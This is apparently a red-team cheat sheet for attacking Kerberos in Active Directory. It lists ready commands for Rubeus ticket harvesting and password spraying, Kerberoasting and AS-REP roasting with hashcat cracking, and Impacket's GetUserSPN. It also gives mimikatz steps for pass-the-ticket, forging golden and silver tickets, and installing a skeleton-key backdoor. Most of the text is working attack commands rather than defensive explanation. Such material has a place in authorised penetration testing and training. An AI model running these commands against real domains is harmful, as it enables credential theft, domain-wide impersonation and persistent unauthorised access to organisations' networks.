# Rubeus

Rubeus is a powerful tool for attacking Kerberos.

- [Rubeus](https://github.com/GhostPack/Rubeus)

## Cheat Sheet

- Tell Rubeus to harvest for TGTs every 30 seconds
    `Rubeus.exe harvest/interval:30`

## Password spraying
  
- Add domain controller domain name to the host file
    `echo IP_ADDRESS CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`

- Takes a given password and spray against all found users then give the .kirbi TGT for that user
    `Rubeus.exe brute /password:PASSWORD /noticket`

## Kerberoasting

- Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password
- If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account.

**Attack Steps**

- Dump Kerberos hash of any kerberoastable users
  `Rubeus.exe kerberoast`

- Copy hash to your attacker machine (.txt file) to crack it with `hashcat`
  `hashcat -m 13100 -a 0 hash.txt Pass.txt`

## Dumping KRBASREP5 Hashes

- AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled.
- Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled

**Attack Steps**

- Runs AS-REP roast command looking for vulnerable users and then dumps user hashes
  `Rubeus.exe asreproast`
- Copy hash to attacker machine (.txt file) to crack with `hashcat`
- Insert `23$` after `$krb5asrep$` on the first line
- `hashcat -m 18200 hash.txt Pass.txt`

# Impacket

- [Impacket Download](https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19)

## Kerberoasting

- Install all needed dependencies
  `pip install .`

- Navigate to where `GetUserSPN.py` is located
  `cd /usr/share/doc/python3-impacket/examples/`

- Dump Kerberos hash for all kerberoastable accounts it can find on the target domain (similar to Rubeus but this does not have to be on the target machine and can be done remotely)
  `sudo python3 GetUserSPN.py DOMAIN/MACHINE1:PASSWORD -dc-ip IP_ADDRESS -request`


## Pass the Ticket w/ mimikatz

- Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to dump a TGT from LSASS memory

**Attack Steps** 

- Run mimikatz.exe
  `mimikatz.exe`

- Ensure `privilege::debug` outputs `[output'20'OK]`
- Export all of the .kirbi tickets into the directory you are in
  `sekurlsa::tickets/export`

- Run this command inside `mimikatz` with the ticket harvested (Look for an Admin ticket)
  `kerberos::ptt <ticket>`

- Exit `mimikatz` and run `klist` command to verify that we are impersonating the ticket


## Golden/Silver Ticket Attacks w/ mimikatz

- The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.

**Atack Steps**

- **Dump the `krbtgt` hash**
  - Run mimikatz.exe
  - Ensure `privilege::debug` outputs `[output'20'OK]`
  - Dump the hash as wall as the security identifier needed to create a Golden Ticket
    `lsadump::lsa /inject /name:krbtgt`
    - To create a Silver ticket change the `/name:` to dump the hash of a domain admin or a service account
  
- **Create a Golden/Silver Ticket**
  - Command to create a golden ticket
    `Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:`
    - To create a silver ticket put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103

- **Use the Golden.Silver Ticket to access other machines**
  - This will open an elevated command prompt with the given ticket in mimikatz
    `misc::cmd`
  - Golden Tickets let you access entire network but silver tickets only give you access to what the user has access to

## Kerberos Backdoors w/ mimikatz

- Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password.
- Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption.

**Attack Steps**

- Run mimikatz and ensure you have local admin, the usual stuff
- Install the Skeleton key
  `misc::skeleton`
- Access the forest (default creds will be "mimikatz")
  - Example: `net use C:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz`
    - Share will be accessible without the need for the Admin password
  - Example: `dir \\Desktop-1\c$ /user:Machine1 mimikatz`
    - Access directory of Desktop-1 without knowing what users have access to it

## Resources

- https://medium.com/@t0pazg3mpass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a
- https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat
- https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1
- https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/
- https://www.varonis.com/blog/kerberos-authentication-explained/
- https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf
- https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf
- https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf